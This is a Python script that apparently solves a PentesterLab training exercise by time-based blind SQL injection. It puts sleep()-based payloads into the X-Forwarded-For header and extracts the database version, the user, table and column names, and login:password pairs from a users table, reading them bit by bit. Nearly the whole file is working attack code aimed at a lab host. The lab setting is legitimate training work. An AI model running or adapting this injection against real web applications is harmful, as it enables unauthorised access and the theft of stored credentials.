#!/usr/bin/env python3

""" PentesterLab Blind sqli script

This is a simple blind sqli script written in python to solve the challenge 
found here https://pentesterlab.com/exercises/from_sqli_to_shell_II/course 

"""

import requests
from time import time

VULNERABLE_HOST = "http://172.16.216.132"
PORT = 80
# for use with Burp or your favorite proxy to intercept requests for debugging
PROXIES = {"http": "http://127.0.0.1:9090", "https": "http://127.0.0.1:9090"}

queries = [
    "SELECT version()",
    "SELECT user()",
    "SELECT table_name FROM information_schema.tables",
    "select concat(login,':',password) from users",
    "SELECT column_name FROM information_schema.columns",
]


def get_query(queries: list):
    """ function to get the user's injection choice """
    print(
        f"1: {queries[0]}\n2: {queries[1]}\n3: {queries[2]}\n4: {queries[3]} (get admin)\n"
    )
    selection = int(input("please select your query: "))
    return queries[selection - 1]


def make_request(sql: str):
    """ function that makes request to the vulnerable server """
    injection = f"hacker' or if(({sql}),sleep({sleep_setting}),0) and '1'='1"
    headers = {"X-Forwarded-For": f"{injection}"}
    tic = time()
    try:
        requests.get(
            VULNERABLE_HOST, proxies=None, verify=False, headers=headers
        )
    except:
        print("encountered error connecting")
        exit()
    toc = time()
    run_time = toc - tic

    if run_time > sleep_setting:
        return True
    else:
        return False


i = 0
value = 1
result = ""
index = 0
sleep_setting = 2

query = get_query(queries)

while index < 10:

    new_injection = query + f" limit {index},1"

    while value != 0:
        i += 1
        value = 0
        for bit in range(0, 7):
            sql = f"select ascii(substring(({new_injection}),{i},1))&{2**bit}"
            if make_request(sql) == True:
                value += 2 ** bit
        result += chr(value)
        print(f"in progress, so far it is {result}")

    print(f"final result is: {result}")

    # reset values
    value = 1
    result = ""
    i = 0

    index += 1
